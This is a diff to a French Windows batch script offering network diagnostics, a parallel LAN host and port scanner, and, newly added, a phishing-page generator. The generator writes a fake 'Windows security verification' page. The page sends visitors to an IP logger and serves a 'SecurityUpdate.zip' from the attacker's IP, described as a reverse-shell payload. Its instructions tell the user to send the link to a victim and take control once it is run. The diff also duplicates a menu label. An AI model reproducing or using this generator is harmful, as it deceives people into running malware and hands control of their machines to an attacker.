@@ -1405,126 +1405,22 @@ pause
 goto sys_network_menu
 
 REM ===================================================================
-REM              CYBERSECURITE RESEAU
+REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 :net_cyber_menu
 cls
-set "opts=RECONT - Trouver des infos sur une cible;RESEAU - Cartographier son reseau local;WEB - Tester les failles d'un site web;DEFENSE - Auditer la securite de son PC;RAPPORTS - Generer des audits HTML/JSON"
-call :DynamicMenu "CYBERSECURITE - CHOISISSEZ UNE CATEGORIE" "%opts%" "NONUMS"
+set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);RETOUR"
+call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
 set "cyber_choice=%errorlevel%"
 
 if "%cyber_choice%"=="0" goto menu_principal
-if "%cyber_choice%"=="1" goto cat_recon
-if "%cyber_choice%"=="2" goto cat_network
-if "%cyber_choice%"=="3" goto cat_web
-if "%cyber_choice%"=="4" goto cat_defense
-if "%cyber_choice%"=="5" goto cat_reports
+if "%cyber_choice%"=="1" goto cyber_triage
+if "%cyber_choice%"=="2" goto cyber_adapter_audit
+if "%cyber_choice%"=="3" goto cyber_lan_scan
+if "%cyber_choice%"=="4" goto cyber_flux_analysis
+if "%cyber_choice%"=="5" goto cyber_dns_leak
+if "%cyber_choice%"=="6" goto menu_principal
 goto net_cyber_menu
-
-:cat_recon
-cls
-set "opts=[--- RECONNAISSANCE ET INFOS ---]"
-set "opts=%opts%;WHOIS - Verifier proprietaire et herbergeur~Identifie a qui appartient un domaine ou une IP (Whois, ASN, FAI)"
-set "opts=%opts%;Liste des sous-domaines (crt.sh)~Recherche passive de tous les serveurs lies a un domaine (Certificats SSL)"
-set "opts=%opts%;Dump des records DNS (AXFR)~Tente de recuperer toute la configuration DNS du serveur (Si mal securise)"
-set "opts=%opts%;Exploration Robots.txt/Sitemap~Trouve les dossiers caches et les panels d'administration du site"
-set "opts=%opts%;Bruteforce de sous-domaines (DNS)~Teste les noms courants (dev, api...) pour trouver des services caches"
-
-call :DynamicMenu "RECONNAISSANCE - Collecte passive et active" "%opts%" "NONUMS"
-set "recon_c=%errorlevel%"
-if "%recon_c%"=="0" goto net_cyber_menu
-if "%recon_c%"=="1" goto recon_whois
-if "%recon_c%"=="2" goto recon_crtsh
-if "%recon_c%"=="3" goto recon_axfr
-if "%recon_c%"=="4" goto recon_robots
-if "%recon_c%"=="5" goto recon_subdomain_brute
-goto cat_recon
-
-:cat_network
-cls
-set "opts=[--- ANALYSE ET CARTOGRAPHIE RESEAU ---]"
-set "opts=%opts%;Bilan rapide de connexion (Flash)~Verifie l'acces internet, la passerelle et le DNS en 1s"
-set "opts=%opts%;Details des cartes reseau (MAC/MTU)~Affiche les infos physiques et techniques des adaptateurs"
-set "opts=%opts%;Scan du reseau local (LAN)~Decouvre les appareils connectes, leurs marques et services"
-set "opts=%opts%;Ports ouverts et Logiciels actifs~Identifie quel programme utilise quel port sur votre PC"
-set "opts=%opts%;Detection de fuites DNS~Verifie si votre navigation est bien anonymisee (VPN)"
-set "opts=%opts%;Changement de serveurs DNS~Passe sur Cloudflare ou Google pour plus de rapidite"
-
-call :DynamicMenu "ANALYSE RESEAU - Scanner et cartographier" "%opts%" "NONUMS"
-set "net_c=%errorlevel%"
-if "%net_c%"=="0" goto net_cyber_menu
-if "%net_c%"=="1" goto cyber_triage
-if "%net_c%"=="2" goto cyber_adapter_audit
-if "%net_c%"=="3" goto cyber_lan_scan
-if "%net_c%"=="4" goto cyber_flux_analysis
-if "%net_c%"=="5" goto cyber_dns_leak
-if "%net_c%"=="6" goto dns_manager
-goto cat_network
-
-:cat_web
-cls
-set "opts=[--- TESTS D'INTRUSION WEB ---]"
-set "opts=%opts%;Scan de failles automatique (Global)~Teste headers, XSS, SQLi et securite de base en une fois"
-set "opts=%opts%;Injections SQL manuelles (SQLi)~Detection avancee de failles de base de donnees"
-set "opts=%opts%;Recherche de fichiers critiques exposes~Cherche les .env, backups et dossiers de config (.git)"
-set "opts=%opts%;Injection de templates (SSTI)~Teste si un moteur de template est vulnerable a l'execution de code"
-set "opts=%opts%;Lecture via fichiers XML (XXE)~Exploite le parseur XML pour lire des fichiers internes"
-set "opts=%opts%;Analyse et attaque de tokens JWT~Decode les tokens de session et tente de les forger"
-set "opts=%opts%;Detournement de requetes (SSRF)~Force le serveur a attaquer son propre reseau interne"
-set "opts=%opts%;Detection de prise de controle DNS (Takeover)~Cherche les sous-domaines pointant vers des services morts"
-set "opts=%opts%;Audit des Comptes et Sessions~Teste le brute-force, CSRF et la robustesse des logins"
-set "opts=%opts%;Controle du chiffrement SSL/TLS~Audite la solidite du HTTPS et du certificat"
-set "opts=%opts%;Acces aux fichiers systeme (LFI)~Exploite les chemins de fichiers mal proteges"
-set "opts=%opts%;Vulnerabilite de Redirection (Open Redirect)~Teste les liens qui peuvent rediriger vers des sites pirates"
-
-call :DynamicMenu "WEB OFFENSIF - Tests de vulnerabilites (autorisation ecrite obligatoire)" "%opts%" "NONUMS"
-set "web_c=%errorlevel%"
-if "%web_c%"=="0" goto net_cyber_menu
-if "%web_c%"=="1" goto cyber_web_pentest
-if "%web_c%"=="2" goto cyber_sqli_blind
-if "%web_c%"=="3" goto cyber_exposed_files
-if "%web_c%"=="4" goto adv_ssti
-if "%web_c%"=="5" goto adv_xxe
-if "%web_c%"=="6" goto adv_jwt
-if "%web_c%"=="7" goto cyber_ssrf
-if "%web_c%"=="8" goto cyber_subdomain_takeover
-if "%web_c%"=="9" goto cyber_auth_test
-if "%web_c%"=="10" goto cyber_tls_scan
-if "%web_c%"=="11" goto cyber_lfi_scan
-if "%web_c%"=="12" goto cyber_open_redirect
-goto cat_web
-
-:cat_defense
-cls
-set "opts=[--- AUDIT ET PROTECTION DU PC ---]"
-set "opts=%opts%;Audit d'elevation de privileges (SYSTEM)~Cherche comment un malware pourrait devenir Administrateur"
-set "opts=%opts%;Scan de ports et Firewall~Verifie les portes ouvertes et l'efficacite du pare-feu"
-set "opts=%opts%;Securisation de site (.htaccess)~Cree une configuration Apache blindee contre les attaques"
-set "opts=%opts%;Test de l'antivirus (Fichier EICAR)~Simule un virus inoffensif pour voir si votre protection reagit"
-
-call :DynamicMenu "AUDIT DEFENSIF - Verifier votre propre securite" "%opts%" "NONUMS"
-set "def_c=%errorlevel%"
-if "%def_c%"=="0" goto net_cyber_menu
-if "%def_c%"=="1" goto cyber_privesc_audit
-if "%def_c%"=="2" goto cyber_security_audit
-if "%def_c%"=="3" goto cyber_gen_htaccess
-if "%def_c%"=="4" goto sys_av_test
-goto cat_defense
-
-:cat_reports
-cls
-set "opts=[--- GENERATION DE RAPPORTS ---]"
-set "opts=%opts%;Rapport Audit Web complet (HTML)~Genere un dossier de preuve professionnel sur un site web"
-set "opts=%opts%;Rapport Audit Reseau Local (HTML)~Diagnostique la securite globale du PC et du LAN"
-set "opts=%opts%;Exporter les donnees en JSON~Format structure pour analyse dans des outils tiers"
-
-call :DynamicMenu "RAPPORTS - Exporter les resultats" "%opts%" "NONUMS"
-set "rpt_c=%errorlevel%"
-if "%rpt_c%"=="0" goto net_cyber_menu
-if "%rpt_c%"=="1" goto cyber_pentest_report
-if "%rpt_c%"=="2" goto cyber_security_report
-if "%rpt_c%"=="3" goto cyber_export_json
-goto cat_reports
 
 :cyber_triage
 cls
@@ -1532,20 +1428,16 @@ echo.
 echo  ================================================
 echo   TRIAGE DE CONNECTIVITE (FLASH)
 echo  ================================================
-echo   Effectue un diagnostic rapide de votre
-echo   connectivite locale et Internet.
 echo.
-echo  [i] Appuyez sur ECHAP pour annuler le triage.
-echo.
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host '--- CONFIGURATION IP ---' -f Cyan; Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress | Format-Table -HideTableHeaders; Write-Host '--- PASSERELLE ---' -f Cyan; (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA SilentlyContinue | Select-Object -ExpandProperty NextHop -First 1); Write-Host '--- DNS ---' -f Cyan; (Get-DnsClientServerAddress).ServerAddresses | Select-Object -Unique; Write-Host '--- TEST INTERNET ---' -f Cyan; if (Test-Connection 8.8.8.8 -Count 1 -Quiet) { Write-Host '    [OK] INTERNET ACCESSIBLE' -f Green } else { Write-Host '    [ECHEC] PAS D ACCES INTERNET' -f Red }"
-echo.
-echo  [!] ANALYSE DES RISQUES (Reconn.) :
-echo  1. Exposition : Votre IP locale est visible par tous les sites.
-echo  2. DNS : Si vos serveurs sont lents, votre navigation le sera aussi.
-echo  3. Securite : Sans VPN, votre FAI voit tout votre trafic clair.
+echo   [>] 1. Analyse de la configuration IP...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object @{N='Interface';E={$_.InterfaceAlias}}, @{N='Adresse_IP';E={$_.IPAddress}} | Format-Table -AutoSize"
+echo   [>] 2. Test de la passerelle (Box)...
+powershell -NoProfile -Command "$gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA SilentlyContinue | Select-Object -ExpandProperty NextHop -First 1); if($gw){Write-Host '      [OK] Passerelle detectee :' $gw -f Green} else {Write-Host '      [ECHEC] Aucune passerelle !' -f Red}"
+echo   [>] 3. Verification des serveurs DNS...
+powershell -NoProfile -Command "$dns=(Get-DnsClientServerAddress).ServerAddresses | Select-Object -Unique; if($dns){Write-Host '      [OK] DNS actifs :' ($dns -join ', ') -f Green} else {Write-Host '      [ECHEC] Pas de DNS !' -f Red}"
 echo.
 pause
-goto cat_network
+goto net_cyber_menu
 
 :cyber_adapter_audit
 cls
@@ -1553,16 +1445,10 @@ echo.
 echo  ================================================
 echo   AUDIT DES ADAPTATEURS RESEAU
 echo  ================================================
-echo   Analyse l'etat, la vitesse et les adresses
-echo   MAC de vos cartes reseau.
-echo.
-powershell -NoProfile -Command "Get-NetAdapter | Select-Object @{N='Nom';E={$_.Name}}, @{N='Statut';E={switch($_.Status){'Up' {'Actif'}; 'Down' {'Inactif'}; 'Disconnected' {'Deconnecte'}; 'Not Present' {'Absent'}; default {$_.Status}}}}, @{N='Vitesse';E={$_.LinkSpeed}}, @{N='Description';E={$_.InterfaceDescription}} | Format-Table -AutoSize; Write-Host '--- DETAILS PHYSIQUES (MAC / VITESSE) ---' -f Cyan; Get-NetAdapter | Select-Object @{N='Nom';E={$_.Name}}, @{N='Adresse_MAC';E={$_.MacAddress}}, @{N='Vitesse_Liaison';E={$_.LinkSpeed}} | Format-Table -AutoSize"
-echo.
-echo  [i] CONSEIL : Une vitesse de 100 Mbps sur un cable Gigabit (1000)
-echo      indique souvent un cable endommage.
+powershell -NoProfile -Command "Write-Host ' NOM             | STATUT       | VITESSE      | ADRESSE MAC' -f White; Write-Host ' ---------------|--------------|--------------|-------------------' -f Gray; Get-NetAdapter -EA SilentlyContinue | Where-Object {$_.Status -ne 'Not Present'} | ForEach-Object { $s = switch($_.Status){'Up'{'Actif'};'Down'{'Inactif'};'Disconnected'{'Deconnecte'};default{$_.Status}}; Write-Host (' ' + $_.Name.PadRight(15) + ' | ' + $s.PadRight(12) + ' | ' + $_.LinkSpeed.ToString().PadRight(12) + ' | ' + $_.MacAddress) -f Gray }"
 echo.
 pause
-goto cat_network
+goto net_cyber_menu
 
 :cyber_flux_analysis
 cls
@@ -1570,13 +1456,10 @@ echo.
 echo  ================================================
 echo   ANALYSE DES FLUX (PORTS ET PROCESSUS)
 echo  ================================================
-echo   Identifie les logiciels qui utilisent vos
-echo   ports et maintiennent des connexions.
-echo.
 powershell -NoProfile -Command "$conns = Get-NetTCPConnection -State Established,Listen -EA SilentlyContinue; if($conns){ $conns | Select-Object @{N='Port_Local';E={$_.LocalPort}}, @{N='Adresse_Distante';E={$_.RemoteAddress}}, @{N='Etat';E={$_.State}}, @{N='Processus';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} | Sort-Object Etat | Format-Table -AutoSize } else { Write-Host '   Aucune connexion active detectee.' -f Yellow }"
 echo.
 pause
-goto cat_network
+goto net_cyber_menu
 
 :cyber_security_audit
 cls
@@ -1588,7 +1471,7 @@ echo   Audite le pare-feu, les partages SMB et
 echo   detecte les ports pirates.
 echo.
 echo  1. Etat du Pare-feu :
-powershell -NoProfile -Command "$f = Get-NetFirewallProfile; foreach($p in $f){ $c = if($p.Enabled -eq 'True'){'Green'}else{'Red'}; Write-Host ('   [' + $p.Name + '] : ' + $p.Enabled) -f $c }"
+powershell -NoProfile -Command "$f = Get-NetFirewallProfile; foreach($p in $f){ $c = if($p.Enabled -eq 'True'){'Green'}else{'Red'}; $st = if($p.Enabled -eq 'True'){'ACTIF'}else{'INACTIF'}; Write-Host ('   [' + $p.Name + '] : ' + $st) -f $c }"
 echo.
 echo  2. Detection de Ports Suspects (RAT/Backdoors) :
 powershell -NoProfile -Command "$sp=@{1337='DarkComet';4444='Metasploit';31337='BackOrifice';3389='RDP (Acces Distant)'}; $open=Get-NetTCPConnection -State Listen -EA SilentlyContinue | Select-Object -ExpandProperty LocalPort; $found=$false; foreach($p in $sp.Keys){ if($open -contains $p){ Write-Host ('   [ALERTE] Port ' + $p + ' ouvert - ' + $sp[$p]) -f Red; $found=$true } }; if(-not $found){ Write-Host '   [OK] Aucun port pirate suspect.' -f Green }"
@@ -1603,7 +1486,7 @@ echo  3. Partages : SMB est le vecteur prefere des ransomwares (WannaCry).
 echo  CONSEIL : Activez toujours votre pare-feu et desactivez SMBv1.
 echo.
 pause
-goto cat_defense
+goto net_cyber_menu
 
 :cyber_web_pentest
 cls
@@ -1620,7 +1503,7 @@ echo.
 echo  Entrez l'URL a tester (ex: https://example.com ou https://site.com?id=1)
 set "ALEEX_PENTEST_URL="
 set /p "ALEEX_PENTEST_URL=URL : "
-if not defined ALEEX_PENTEST_URL goto cat_web
+if not defined ALEEX_PENTEST_URL goto net_cyber_menu
 
 echo.
 echo  [i] Demarrage du scan pour !ALEEX_PENTEST_URL!...
@@ -1640,7 +1523,8 @@ echo. >> "%WPS%"
 echo function Print-Result($sev, $msg) { >> "%WPS%"
 echo     $script:findings += [PSCustomObject]@{Sev=$sev;Msg=$msg} >> "%WPS%"
 echo     $c = switch($sev){ 'CRITICAL' {'Magenta'}; 'HIGH' {'Red'}; 'MEDIUM' {'Yellow'}; 'LOW' {'Cyan'}; default {'Green'} } >> "%WPS%"
-echo     Write-Host "  [$sev] " -NoNewline -f $c; Write-Host $msg >> "%WPS%"
+echo     $label = switch($sev){ 'CRITICAL' {'CRITIQUE'}; 'HIGH' {'ELEVE'}; 'MEDIUM' {'MOYEN'}; 'LOW' {'FAIBLE'}; default {'INFO'} } >> "%WPS%"
+echo     Write-Host "  [$label] " -NoNewline -f $c; Write-Host $msg >> "%WPS%"
 echo     $pts = switch($sev){ 'CRITICAL' {25}; 'HIGH' {15}; 'MEDIUM' {8}; 'LOW' {3}; default {0} } >> "%WPS%"
 echo     $script:score -= $pts >> "%WPS%"
 echo } >> "%WPS%"
@@ -1922,7 +1806,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
 if exist "%WPS%" del /f /q "%WPS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 
@@ -1970,7 +1854,7 @@ echo  [i] CONSEIL : Pour corriger un "Unquoted Path", utilisez la commande :
 echo      reg add "HKLM\SYSTEM\CurrentControlSet\Services\NOM_DU_SERVICE" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Chemin\Vers\App.exe\"" /f
 echo.
 pause
-goto cat_defense
+goto net_cyber_menu
 
 :cyber_dns_leak
 cls
@@ -1989,99 +1873,485 @@ powershell -NoProfile -Command "try { $r = Resolve-DnsName 'whoami.akamai.net' -
 echo.
 echo  [i] CONSEIL : Si vous utilisez un VPN, vous ne devriez PAS voir les IP 
 echo      de votre box internet ici. Utilisez 1.1.1.1 ou 8.8.8.8 pour plus de securite.
-echo.
 pause
-goto cat_network
+goto net_cyber_menu
+
+:cyber_phishing_gen
+cls
+echo.
+echo  ================================================
+echo   GENERATEUR DE LIEN DE PHISHING (REMOTE)
+echo  ================================================
+echo.
+set /p "webhook=URL de votre IP Logger (ex: Grabify) : "
+set /p "my_ip=Votre IP Publique (pour le retour shell) : "
+echo.
+echo [i] Generation de la page index_phishing.html...
+
+(
+echo ^<!DOCTYPE html^>
+echo ^<html^>^<head^>^<title^>Mise a jour systeme requise^</title^>^<script^>
+echo window.location.href = "%webhook%";
+echo ^</script^>^</head^>
+echo ^<body style="font-family:sans-serif; text-align:center;"^>
+echo ^<h1^>Verification de securite Windows^</h1^>
+echo ^<p^>Votre navigateur nécessite une mise à jour des certificats pour continuer.^</p^>
+echo ^<button onclick="downloadPayload()"^>Mettre a jour maintenant^</button^>
+echo ^<script^>
+echo function downloadPayload() {
+echo   // Ici on simule le lien vers ton script de Reverse Shell
+echo   window.location.href = "http://%my_ip%/SecurityUpdate.zip";
+echo }
+echo ^</script^>^</body^>^</html^>
+) > "%SCRIPT_DIR%index_phishing.html"
+
+echo.
+echo [OK] Fichier 'index_phishing.html' genere.
+echo [!] Instruction : 
+echo     1. Hebergez ce fichier sur un serveur (ou ton PC via Python).
+echo     2. Envoyez le lien de votre serveur a la victime.
+echo     3. Des qu'elle telecharge et lance le fichier, vous avez le controle.
+pause & goto net_cyber_menu
+
+REM ===================================================================
+REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
+REM ===================================================================
+:net_cyber_menu
+cls
+set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);PHISHING - Generateur de lien;RETOUR"
+call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
+set "cyber_choice=%errorlevel%"
+
+if "%cyber_choice%"=="0" goto menu_principal
+if "%cyber_choice%"=="1" goto cyber_triage
+if "%cyber_choice%"=="2" goto cyber_adapter_audit
+if "%cyber_choice%"=="3" goto cyber_lan_scan
+if "%cyber_choice%"=="4" goto cyber_flux_analysis
+if "%cyber_choice%"=="5" goto cyber_dns_leak
+if "%cyber_choice%"=="6" goto cyber_phishing_gen
+if "%cyber_choice%"=="7" goto menu_principal
+goto net_cyber_menu
 
 :cyber_lan_scan
 cls
 echo.
 echo  ================================================
-echo   SCAN RESEAU AVANCE (MARQUES ET MODELES)
+echo   SCAN RESEAU AVANCE (MARQUES, MODELES ^& PORTS)
 echo  ================================================
-echo   Scan ultra-rapide du reseau local pour
-echo   identifier marques et services.
 echo.
 echo  [i] Appuyez sur ECHAP pour annuler le scan.
 echo.
-echo  Initialisation du moteur de scan asynchrone...
-set "SCPS=%TEMP%\fast_scan.ps1"
+set "SCPS=%TEMP%\advanced_turbo_scan.ps1"
 if exist "%SCPS%" del "%SCPS%"
 
-echo $oui = @{ >> "%SCPS%"
-echo    'B8-27-EB'='Raspberry Pi';'DC-A6-32'='Raspberry Pi'; >> "%SCPS%"
-echo    '00-1E-C2'='Apple';'AC-87-A3'='Apple';'64-16-7F'='Apple';'FC-25-3F'='Apple'; >> "%SCPS%"
-echo    'A4-77-33'='Samsung';'FC-A8-41'='Samsung';'48-59-29'='Samsung'; >> "%SCPS%"
-echo    '48-D6-D5'='Xiaomi';'00-9E-C1'='Xiaomi';'64-9A-08'='Xiaomi'; >> "%SCPS%"
-echo    '00-1A-11'='Google';'DA-A1-19'='Google'; >> "%SCPS%"
-echo    '00-24-D7'='Intel';'AC-ED-5C'='Intel'; >> "%SCPS%"
-echo    '00-FF-BB'='Microsoft';'00-15-5D'='Microsoft (VM)'; >> "%SCPS%"
-echo    'FC-DB-B3'='Sony';'00-D9-D1'='Sony';'B0-05-94'='Sony (PS5)'; >> "%SCPS%"
-echo    '8C-FD-F0'='Huawei';'00-E0-FC'='Huawei'; >> "%SCPS%"
-echo    '00-09-B0'='LG';'A4-08-EA'='LG'; >> "%SCPS%"
-echo    '60-01-94'='Espressif (IoT/Ampoule)';'AC-D5-64'='Espressif'; >> "%SCPS%"
-echo    '00-11-32'='Synology';'D0-52-A8'='Nintendo Switch';'98-B6-E9'='Philips Hue' >> "%SCPS%"
-echo } >> "%SCPS%"
+>  "%SCPS%" echo $oui = @{'B8-27-EB'='Raspberry Pi';'DC-A6-32'='Raspberry Pi';'E4-5F-01'='Raspberry Pi';'00-1E-C2'='Apple';'AC-87-A3'='Apple';'64-16-7F'='Apple';'A4-77-33'='Samsung';'48-D6-D5'='Xiaomi';'00-1A-11'='Google';'00-FF-BB'='Microsoft';'38-07-16'='Freebox';'E4-9E-12'='Freebox';'00-11-32'='Synology'}
+>> "%SCPS%" echo $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1
+>> "%SCPS%" echo $myIp = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4).IPAddress
+>> "%SCPS%" echo $base = ($myIp -split '\.')[0..2] -join '.'
+>> "%SCPS%" echo Write-Host "  Cible   : $base.1 a $base.254" -f Cyan
+>> "%SCPS%" echo $jobs = 1..254 ^| ForEach-Object {
+>> "%SCPS%" echo     $target = "$base.$_"
+>> "%SCPS%" echo     [PowerShell]::Create().AddScript({
+>> "%SCPS%" echo         param($ip, $ouiMap)
+>> "%SCPS%" echo         $res = @{ IP = $ip; Status = 'Down'; Name = ''; Brand = 'Inconnu'; Ports = @() }
+>> "%SCPS%" echo         $p = New-Object System.Net.NetworkInformation.Ping
+>> "%SCPS%" echo         try {
+>> "%SCPS%" echo             $reply = $p.Send($ip, 400)
+>> "%SCPS%" echo             if ($reply.Status -eq 'Success') {
+>> "%SCPS%" echo                 $res.Status = 'Up'
+>> "%SCPS%" echo                 try { $res.Name = [System.Net.Dns]::GetHostEntry($ip).HostName } catch { $res.Name = "Inconnu" }
+>> "%SCPS%" echo                 $arp = Get-NetNeighbor -IPAddress $ip -EA SilentlyContinue ^| Select-Object -First 1
+>> "%SCPS%" echo                 if ($arp) {
+>> "%SCPS%" echo                     $mac = $arp.LinkLayerAddress.ToUpper().Replace(':','-')
+>> "%SCPS%" echo                     $prefix = if($mac.Length -ge 8){$mac.Substring(0,8)}else{''}
+>> "%SCPS%" echo                     if ($ouiMap.ContainsKey($prefix)) { $res.Brand = $ouiMap[$prefix] }
+>> "%SCPS%" echo                 }
+>> "%SCPS%" echo                 $testPorts = @(21, 22, 23, 80, 443, 445, 3389, 8080)
+>> "%SCPS%" echo                 foreach ($pt in $testPorts) {
+>> "%SCPS%" echo                     $tcp = New-Object System.Net.Sockets.TcpClient
+>> "%SCPS%" echo                     $connect = $tcp.BeginConnect($ip, $pt, $null, $null)
+>> "%SCPS%" echo                     if ($connect.AsyncWaitHandle.WaitOne(70, $false) -and $tcp.Connected) { $res.Ports += $pt }
+>> "%SCPS%" echo                     $tcp.Close()
+>> "%SCPS%" echo                 }
+>> "%SCPS%" echo             }
+>> "%SCPS%" echo         } catch {}
+>> "%SCPS%" echo         return $res
+>> "%SCPS%" echo     }).AddArgument($target).AddArgument($oui)
+>> "%SCPS%" echo }
+>> "%SCPS%" echo $running = $jobs ^| ForEach-Object { @{ Obj = $_; Async = $_.BeginInvoke(); IP = $_.Commands.Commands[0].Parameters[0].Value } }
+>> "%SCPS%" echo while ($running.Count -gt 0) {
+>> "%SCPS%" echo     if ($Host.UI.RawUI.KeyAvailable) { if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { break } }
+>> "%SCPS%" echo     $done = $running ^| Where-Object { $_.Async.IsCompleted -eq $true }
+>> "%SCPS%" echo     foreach ($j in $done) {
+>> "%SCPS%" echo         $r = $j.Obj.EndInvoke($j.Async)
+>> "%SCPS%" echo         if ($r.Status -eq 'Up') {
+>> "%SCPS%" echo             Write-Host ("`r" + " " * 100 + "`r") -NoNewline
+>> "%SCPS%" echo             Write-Host "  [+] $($r.IP.PadRight(15))" -NoNewline -f Green
+>> "%SCPS%" echo             Write-Host " - $($r.Brand) " -NoNewline -f Yellow
+>> "%SCPS%" echo             Write-Host "($($r.Name))" -f Gray
+>> "%SCPS%" echo             if ($r.Ports.Count -gt 0) { Write-Host "      Ports ouverts : $($r.Ports -join ', ')" -f Cyan }
+>> "%SCPS%" echo             $r.IP ^| Out-File -Append "%TEMP%\found_ips.txt" -Encoding ASCII
+>> "%SCPS%" echo         }
+>> "%SCPS%" echo         $running = $running ^| Where-Object { $_.Async -ne $j.Async }
+>> "%SCPS%" echo     }
+>> "%SCPS%" echo     if ($running.Count -gt 0) { Write-Host ("`r  [>] Analyse IP : $($running[0].IP.PadRight(15)) ($($running.Count) restantes)...") -NoNewline -f DarkGray }
+>> "%SCPS%" echo     Start-Sleep -m 20
+>> "%SCPS%" echo }
 
-echo $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1 >> "%SCPS%"
-echo $ip = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4 ^| Select-Object -First 1).IPAddress >> "%SCPS%"
-echo $base = ($ip -split '\.')[0..2] -join '.' >> "%SCPS%"
-echo Write-Host "  Cible : $base.1 a $base.254" -f Cyan >> "%SCPS%"
-echo Write-Host "  Vitesse : Mode Turbo (Parallele)" -f Yellow >> "%SCPS%"
-echo Write-Host "" >> "%SCPS%"
-echo $tasks = 1..254 ^| ForEach-Object { $p = New-Object System.Net.NetworkInformation.Ping; [PSCustomObject]@{ IP = "$base.$_"; Task = $p.SendPingAsync("$base.$_", 1200) } } >> "%SCPS%"
-echo while ($tasks.Task.Status -match 'Running^|Waiting') { >> "%SCPS%"
-echo    if ($Host.UI.RawUI.KeyAvailable) { >> "%SCPS%"
-echo        $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') >> "%SCPS%"
-echo        if ($key.VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule par l'utilisateur (ECHAP)." -f Red; exit } >> "%SCPS%"
-echo    } >> "%SCPS%"
-echo    Start-Sleep -m 100 >> "%SCPS%"
-echo } >> "%SCPS%"
-echo $found = 0 >> "%SCPS%"
-echo foreach ($t in $tasks) { >> "%SCPS%"
-echo    if ($t.Task.Result.Status -eq 'Success') { >> "%SCPS%"
-echo        $n = 'Inconnu'; try { $n = [System.Net.Dns]::GetHostEntry($t.IP).HostName } catch {} >> "%SCPS%"
-echo        $mac = 'Inconnue'; $brand = 'Inconnu'; >> "%SCPS%"
-echo        $neighbor = Get-NetNeighbor -IPAddress $t.IP -EA SilentlyContinue ^| Select-Object -First 1 >> "%SCPS%"
-echo        if ($neighbor) { >> "%SCPS%"
-echo            $mac = $neighbor.LinkLayerAddress.ToUpper().Replace(':','-') >> "%SCPS%"
-echo            $prefix = $mac.Substring(0,8) >> "%SCPS%"
-echo            if ($oui.ContainsKey($prefix)) { $brand = $oui[$prefix] } >> "%SCPS%"
-echo        } >> "%SCPS%"
-echo        Write-Host "  [+] $($t.IP) " -NoNewline -f Green >> "%SCPS%"
-echo        Write-Host "- $n " -NoNewline -f Gray >> "%SCPS%"
-echo        Write-Host "($brand)" -f Yellow >> "%SCPS%"
-echo        if ($mac -ne 'Inconnue') { Write-Host "      MAC: $mac" -f DarkGray } >> "%SCPS%"
-echo        $ports = @(22, 80, 443, 445, 3389, 8080) >> "%SCPS%"
-echo        $openPorts = @() >> "%SCPS%"
-echo        foreach ($port in $ports) { >> "%SCPS%"
-echo            $tcp = New-Object System.Net.Sockets.TcpClient >> "%SCPS%"
-echo            $async = $tcp.BeginConnect($t.IP, $port, $null, $null) >> "%SCPS%"
-echo            if ($async.AsyncWaitHandle.WaitOne(100, $false) -and $tcp.Connected) { $openPorts += $port } >> "%SCPS%"
-echo            $tcp.Close() >> "%SCPS%"
-echo        } >> "%SCPS%"
-echo        if($openPorts){ Write-Host "      Ports ouverts: $($openPorts -join ', ')" -f Cyan } >> "%SCPS%"
-echo        $found++ >> "%SCPS%"
-echo    } >> "%SCPS%"
-echo } >> "%SCPS%"
-echo if ($found -gt 0) { >> "%SCPS%"
-echo     Write-Host "`n  Scan termine ! $found appareil(s) detecte(s)" -f Cyan >> "%SCPS%"
-echo     Write-Host "" >> "%SCPS%"
-echo     Write-Host "  [!] ANALYSE DES RISQUES (RESEAU LOCAL) :" -f Red >> "%SCPS%"
-echo     Write-Host "  1. Visibilite : Un intrus voit desormais vos PC, NAS, et objets connectes." -f Yellow >> "%SCPS%"
-echo     Write-Host "  2. Ports ouverts : Chaque port (80, 445, 3389) est une porte potentielle." -f Yellow >> "%SCPS%"
-echo     Write-Host "  3. Empreinte : Connaitre la marque (Samsung, Apple) facilite le choix des exploits." -f Yellow >> "%SCPS%"
-echo     Write-Host "  CONSEIL : Fermez les ports inutiles et isolez vos objets connectes (VLAN)." -f Cyan >> "%SCPS%"
-echo } else { >> "%SCPS%"
-echo     Write-Host "`n  Fin du scan. Aucun appareil trouve sur cette plage." -f DarkGray >> "%SCPS%"
-echo } >> "%SCPS%"
-
+if exist "%TEMP%\found_ips.txt" del "%TEMP%\found_ips.txt"
 powershell -NoProfile -ExecutionPolicy Bypass -File "%SCPS%"
 if exist "%SCPS%" del "%SCPS%"
+
+echo.
